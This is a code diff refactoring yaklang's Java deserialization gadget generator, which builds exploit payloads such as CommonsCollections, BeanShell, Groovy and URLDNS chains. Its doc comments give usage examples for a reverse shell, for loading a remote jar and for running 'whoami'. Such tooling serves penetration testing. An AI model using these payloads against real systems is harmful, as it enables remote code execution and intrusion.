@@ -5,7 +5,7 @@ import (
 	"fmt"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yserx"
-	"reflect"
+	"strings"
 )
 
 type GadgetInfo struct {
@@ -52,11 +52,11 @@ func init() {
 				for _, opt := range options {
 					anyOpts = append(anyOpts, opt)
 				}
-				return GenerateGadget(name, anyOpts...)
+				return GenerateGadget(string(name), anyOpts...)
 			}
 		} else {
 			f = func(cmd string) (*JavaObject, error) {
-				return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
+				return GenerateGadget(string(name), "raw_cmd", cmd)
 			}
 		}
 		AllGadgets[name] = &GadgetInfo{
@@ -89,85 +89,94 @@ var verboseWrapper = func(y yserx.JavaSerializable, verbose *GadgetInfo) *JavaOb
 
 type TemplatesGadget func(options ...GenClassOptionFun) (*JavaObject, error)
 type RuntimeExecGadget func(cmd string) (*JavaObject, error)
-type GenGadgetOptionFun func(*GenerateGadgetConfig)
-type GenerateGadgetConfig struct {
-	ChainType string
-	Args      []string
-	ArgsMap   map[string]string
-}
 
-func SetGadgetParam(params map[string]string) GenGadgetOptionFun {
-	return func(config *GenerateGadgetConfig) {
-		config.ArgsMap = params
-	}
-}
-func SetTransformChainTypeByMap(s string, params map[string]string) GenGadgetOptionFun {
-	return func(config *GenerateGadgetConfig) {
-		config.ChainType = s
-		if v, ok := YsoConfigInstance.ReflectChainFunction[GadgetType(s)]; ok {
-			for _, arg := range v.Args {
-				if val, ok := params[string(arg.Name)]; ok {
-					config.Args = append(config.Args, val)
-				} else {
-					config.Args = append(config.Args, "")
-				}
-			}
-		}
-	}
-}
-
-func SetTransformChainType(s string, args ...string) GenGadgetOptionFun {
-	return func(config *GenerateGadgetConfig) {
-		config.ChainType = s
-		config.Args = args
-	}
-}
-
-func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
-	genConfig := &GenerateGadgetConfig{}
-	var genClassesOpt []GenClassOptionFun
+// GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:
+//  1. Generate a Java object that have no any params.
+//     Example: GenerateGadget("CommonsCollections1")
+//  2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.
+//     Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")
+//  3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.
+//     Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
+//  4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.
+//     Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
+//  5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.
+//     Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
+//  6. Generate a Java object that implement by TemplateImpl.
+//     Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))
+func GenerateGadget(name string, opts ...any) (*JavaObject, error) {
+	genClassOpt := []GenClassOptionFun{}
 	for _, opt := range opts {
-		switch f := any(opt).(type) {
-		case GenGadgetOptionFun:
-			f(genConfig)
-		case GenClassOptionFun:
-			genClassesOpt = append(genClassesOpt, f)
-		default:
-			return nil, utils.Errorf("unknown option type: %v(need type GenGadgetOptionFun or GenClassOptionFun)", reflect.TypeOf(opt).String())
+		if v, ok := opt.(GenClassOptionFun); ok {
+			genClassOpt = append(genClassOpt, v)
 		}
 	}
-	cfg, ok := YsoConfigInstance.Gadgets[name]
+	if len(genClassOpt) > 0 {
+		if len(genClassOpt) == len(opts) {
+			return GenerateTemplateImplGadget(name, genClassOpt...)
+		} else {
+			return nil, utils.Errorf("invalid param format")
+		}
+	}
+	gadgetName := name
+	funName := ""
+	defaultParam := ""
+	var params map[string]string
+
+	if len(opts) == 0 {
+		// no params
+	} else {
+		if len(opts) != 2 {
+			return nil, utils.Errorf("invalid param format")
+		}
+		if v, ok := opts[0].(string); ok {
+			funName = v
+		} else {
+			return nil, utils.Errorf("invalid param format")
+		}
+		switch ret := opts[1].(type) {
+		case map[string]string:
+			params = ret
+		case string:
+			defaultParam = ret
+		}
+	}
+
+	cfg, ok := YsoConfigInstance.Gadgets[GadgetType(gadgetName)]
 	if !ok {
-		return nil, utils.Errorf("not found template: %s", name)
+		return nil, utils.Errorf("not found template: %s", gadgetName)
 	}
 	if cfg.IsTemplateImpl {
-		templ := cfg.Template
-		classObj, err := GenerateClass(genClassesOpt...)
-		if err != nil {
-			return nil, err
+		var genClassOpts []GenClassOptionFun
+		genClassOpts = append(genClassOpts, SetClassType(ClassType(funName)))
+		if defaultParam != "" {
+			cfg, ok := YsoConfigInstance.Classes[ClassType(funName)]
+			if !ok {
+				return nil, utils.Errorf("not found class: %s", funName)
+			}
+			if len(cfg.Params) == 1 {
+				genClassOpts = append(genClassOpts, SetClassParam(string(cfg.Params[0].Name), defaultParam))
+			} else {
+				ps := []string{}
+				for _, param := range cfg.Params {
+					ps = append(ps, string(param.Name))
+				}
+				return nil, utils.Errorf("class `%s` need params: %s", funName, strings.Join(ps, ","))
+			}
+		} else {
+			for k, v := range params {
+				genClassOpts = append(genClassOpts, SetClassParam(k, v))
+			}
 		}
-		classObj, err = GenerateClassWithType(ClassTemplateImplClassLoader, SetClassBytes(classObj.Bytes())) // load target class by TemplateImpl loader that can load any class
-		if err != nil {
-			return nil, err
-		}
-		objs, err := yserx.ParseJavaSerialized(templ)
-		if err != nil {
-			return nil, err
-		}
-		obj := objs[0]
-		err = SetJavaObjectClass(obj, classObj)
-		if err != nil {
-			return nil, utils.Errorf("config gadget %s class object failed: %v", name, err)
-		}
-		return verboseWrapper(obj, AllGadgets[name]), nil
-	} else if genConfig.ChainType != "" {
-		chainType := genConfig.ChainType
-		if chainType == "" {
-			chainType = "raw_cmd"
-		}
+		return GenerateTemplateImplGadget(gadgetName, genClassOpts...)
+	} else if cfg.Template == nil {
+		chainType := funName
 		template, ok := cfg.ChainTemplate[chainType]
 		if !ok {
-			return nil, utils.Errorf("not support transform chain type: %s", chainType)
+			return nil, utils.Errorf("not support transform chain type: `%s`", chainType)
+		}
+		funMap, ok := YsoConfigInstance.ReflectChainFunction[funName]
+		if !ok {
+			return nil, utils.Errorf("not found transform chain function: `%s`", funName)
 		}
 		objs, err := yserx.ParseJavaSerialized(template)
 		if err != nil {
@@ -177,18 +186,47 @@ func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
 			return nil, utils.Error("parse gadget error")
 		}
 		obj := objs[0]
-		if len(genConfig.Args) == 0 {
-			return nil, utils.Errorf("transform chain template need at least one arg")
-		}
-		for i, arg := range genConfig.Args {
-			err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), arg, 1)
+		if defaultParam != "" {
+			err = ReplaceStringInJavaSerilizable(obj, "{{param0}}", defaultParam, 1)
 			if err != nil {
 				return nil, err
 			}
+		} else {
+			for i, p := range funMap.Args {
+				val, ok := params[string(p.Name)]
+				if !ok {
+					if p.DefaultValue != "" {
+						val = p.DefaultValue
+						ok = true
+					}
+				}
+				if !ok {
+					return nil, errors.New("missing param: " + string(p.Name))
+				}
+				err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), val, 1)
+				if err != nil {
+					return nil, err
+				}
+			}
 		}
-		return verboseWrapper(obj, AllGadgets[name]), nil
+		return verboseWrapper(obj, AllGadgets[GadgetType(gadgetName)]), nil
 	} else {
 		template := cfg.Template
+		if cfg.ReferenceFun == "" {
+			objs, err := yserx.ParseJavaSerialized(template)
+			if err != nil {
+				return nil, err
+			}
+			if len(objs) <= 0 {
+				return nil, utils.Error("parse gadget error")
+			}
+			obj := objs[0]
+			return verboseWrapper(obj, AllGadgets[GadgetType(gadgetName)]), nil
+		}
+		funMap, ok := YsoConfigInstance.ReflectChainFunction[cfg.ReferenceFun]
+		if !ok {
+			return nil, utils.Errorf("config.yaml has error, not found transform chain function: `%s`", cfg.ReferenceFun)
+		}
 		objs, err := yserx.ParseJavaSerialized(template)
 		if err != nil {
 			return nil, err
@@ -197,19 +235,66 @@ func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
 			return nil, utils.Error("parse gadget error")
 		}
 		obj := objs[0]
-
-		for i, param := range cfg.Params {
-			if val, ok := genConfig.ArgsMap[string(param.Name)]; ok {
-				err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), val, -1)
+		if defaultParam != "" {
+			if len(funMap.Args) != 1 {
+				ps := []string{}
+				for _, arg := range funMap.Args {
+					ps = append(ps, string(arg.Name))
+				}
+				return nil, utils.Errorf("transform chain function `%s` need params: %s", cfg.ReferenceFun, strings.Join(ps, ","))
+			} else {
+				err = ReplaceStringInJavaSerilizable(obj, "{{param0}}", defaultParam, -1)
 				if err != nil {
 					return nil, err
 				}
-			} else {
-				return nil, errors.New("missing param: " + string(param.Name))
+			}
+		} else {
+			for i, param := range funMap.Args {
+				val, ok := params[string(param.Name)]
+				if !ok {
+					if param.DefaultValue != "" {
+						val = param.DefaultValue
+						ok = true
+					}
+				}
+				if !ok {
+					return nil, errors.New("missing param: " + string(param.Name))
+				}
+				err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), val, 1)
+				if err != nil {
+					return nil, err
+				}
 			}
 		}
-		return verboseWrapper(obj, AllGadgets[name]), nil
+
+		return verboseWrapper(obj, AllGadgets[GadgetType(gadgetName)]), nil
 	}
+}
+
+func GenerateTemplateImplGadget(name string, opts ...GenClassOptionFun) (*JavaObject, error) {
+	cfg, ok := YsoConfigInstance.Gadgets[GadgetType(name)]
+	if !ok {
+		return nil, utils.Errorf("not found template: %s", name)
+	}
+	classObj, err := GenerateClass(opts...)
+	if err != nil {
+		return nil, err
+	}
+	newOpts := append(opts, SetClassType(ClassTemplateImplClassLoader), SetClassBytes(classObj.Bytes()), SetClassName(utils.RandStringBytes(5)))
+	classObj, err = GenerateClass(newOpts...) // load target class by TemplateImpl loader that can load any class
+	if err != nil {
+		return nil, err
+	}
+	objs, err := yserx.ParseJavaSerialized(cfg.Template)
+	if err != nil {
+		return nil, err
+	}
+	obj := objs[0]
+	err = SetJavaObjectClass(obj, classObj)
+	if err != nil {
+		return nil, utils.Errorf("config gadget %s class object failed: %v", name, err)
+	}
+	return verboseWrapper(obj, AllGadgets[GadgetType(name)]), nil
 }
 
 // GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。
@@ -249,7 +334,7 @@ func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetBeanShell1, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetBeanShell1), "raw_cmd", cmd)
 }
 
 // GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
@@ -265,7 +350,7 @@ func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections1, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetCommonsCollections1), "raw_cmd", cmd)
 }
 
 // GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
@@ -281,7 +366,7 @@ func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections5, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetCommonsCollections5), "raw_cmd", cmd)
 }
 
 // GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
@@ -297,7 +382,7 @@ func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections6, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetCommonsCollections6), "raw_cmd", cmd)
 }
 
 // GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
@@ -313,7 +398,7 @@ func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections7, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetCommonsCollections7), "raw_cmd", cmd)
 }
 
 // GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
@@ -329,7 +414,7 @@ func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollectionsK3, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetCommonsCollectionsK3), "raw_cmd", cmd)
 }
 
 // GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
@@ -345,7 +430,7 @@ func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollectionsK4, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetCommonsCollectionsK4), "raw_cmd", cmd)
 }
 
 // GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
@@ -361,7 +446,7 @@ func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
 // println(hexPayload)
 // ```
 func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
-	return GenerateGadget(GadgetGroovy1, SetTransformChainType("raw_cmd", cmd))
+	return GenerateGadget(string(GadgetGroovy1), "raw_cmd", cmd)
 }
 
 // GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
@@ -382,7 +467,7 @@ func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
 //
 // ```
 func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetClick1, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetClick1), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
@@ -403,7 +488,7 @@ func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // )
 // ```
 func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsBeanutils1, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsBeanutils1), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。
@@ -425,7 +510,7 @@ func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, 
 // )
 // ```
 func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsBeanutils2_183, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsBeanutils2_183), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。
@@ -447,7 +532,7 @@ func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 // )
 // ```
 func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsBeanutils2, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsBeanutils2), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -468,7 +553,7 @@ func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaOb
 // )
 // ```
 func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections2, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsCollections2), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
@@ -489,7 +574,7 @@ func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections3, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsCollections3), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -510,7 +595,7 @@ func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections4, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsCollections4), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -531,7 +616,7 @@ func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollections8, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsCollections8), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
@@ -552,7 +637,7 @@ func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject
 // )
 // ```
 func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollectionsK1, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsCollectionsK1), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
@@ -573,7 +658,7 @@ func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObjec
 // )
 // ```
 func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetCommonsCollectionsK2, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetCommonsCollectionsK2), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
@@ -594,7 +679,7 @@ func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObjec
 // )
 // ```
 func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetJBossInterceptors1, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetJBossInterceptors1), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
@@ -615,7 +700,7 @@ func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject,
 // )
 // ```
 func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetJSON1, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetJSON1), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
@@ -636,7 +721,7 @@ func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // )
 // ```
 func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetJavassistWeld1, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetJavassistWeld1), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
@@ -657,7 +742,7 @@ func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, err
 // )
 // ```
 func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetJdk7u21, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetJdk7u21), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
@@ -678,7 +763,7 @@ func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // )
 // ```
 func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
-	return GenerateGadget(GadgetJdk8u20, utils.InterfaceToSliceInterface(options)...)
+	return GenerateGadget(string(GadgetJdk8u20), utils.InterfaceToSliceInterface(options)...)
 }
 
 // GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
@@ -703,9 +788,9 @@ func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 //
 // ```
 func GetURLDNSJavaObject(url string) (*JavaObject, error) {
-	return GenerateGadget(GadgetURLDNS, SetGadgetParam(map[string]string{
+	return GenerateGadget(string(GadgetURLDNS), map[string]string{
 		"domain": url,
-	}))
+	})
 }
 
 // GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
@@ -730,9 +815,9 @@ func GetURLDNSJavaObject(url string) (*JavaObject, error) {
 //
 // ```
 func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
-	return GenerateGadget("FindAllClassesByDNS", SetGadgetParam(map[string]string{
+	return GenerateGadget(string(GadgetFindAllClassesByDNS), "dnslog", map[string]string{
 		"domain": url,
-	}))
+	})
 }
 
 // GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
@@ -746,9 +831,9 @@ func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
 // 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
 // ```
 func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
-	return GenerateGadget(GadgetFindClassByBomb, SetGadgetParam(map[string]string{
+	return GenerateGadget(string(GadgetFindClassByBomb), "class", map[string]string{
 		"class": className,
-	}))
+	})
 }
 
 // GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
@@ -766,7 +851,7 @@ func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 // 发送 payload
 // ```
 func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
-	return GenerateGadget(GadgetSimplePrincipalCollection)
+	return GenerateGadget(string(GadgetSimplePrincipalCollection))
 }
 
 // GetAllGadget 获取所有的支持的Gadget
@@ -787,11 +872,11 @@ func GetAllGadget() []interface{} {
 				for _, opt := range options {
 					anyOpts = append(anyOpts, opt)
 				}
-				return GenerateGadget(name, anyOpts...)
+				return GenerateGadget(string(name), anyOpts...)
 			}
 		} else {
 			f = func(cmd string) (*JavaObject, error) {
-				return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
+				return GenerateGadget(string(name), "raw_cmd", cmd)
 			}
 		}
 		allGadget = append(allGadget, f)
@@ -830,7 +915,7 @@ func GetAllTemplatesGadget() []TemplatesGadget {
 			for _, opt := range options {
 				anyOpts = append(anyOpts, opt)
 			}
-			return GenerateGadget(name, anyOpts...)
+			return GenerateGadget(string(name), anyOpts...)
 		})
 	}
 	return allGadget
@@ -863,7 +948,7 @@ func GetAllRuntimeExecGadget() []RuntimeExecGadget {
 			continue
 		}
 		allGadget = append(allGadget, func(cmd string) (*JavaObject, error) {
-			return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
+			return GenerateGadget(string(name), "raw_cmd", cmd)
 		})
 	}
 	return allGadget
